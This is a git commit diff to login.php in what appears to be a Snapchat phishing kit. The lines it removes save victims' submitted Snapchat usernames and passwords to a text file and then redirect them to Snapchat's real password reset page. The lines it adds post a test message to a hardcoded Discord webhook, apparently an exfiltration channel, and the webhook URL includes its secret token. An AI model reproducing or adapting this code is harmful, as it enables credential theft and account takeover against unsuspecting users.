b5bd693c70e5bea95514f095d4ce94bd95c69aab
DevBaccon <85125377+DevBaccon@users.noreply.github.com>
2025-11-27 19:04:25 +0000

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,18 @@
 <?php
 
-file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
-exit();
+$webhook = "https://discord.com/api/webhooks/1440084893026619498/EghJR4801Er-ZaAFQcKMVSqHD3MCglFGDQqujsGZpkgUg3mNy-TVSouuBcUX7dzERTtF";
+
+$data = [
+    "content" => "hi"
+];
+
+$ch = curl_init($webhook);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+curl_exec($ch);
+curl_close($ch);
+
 ?>
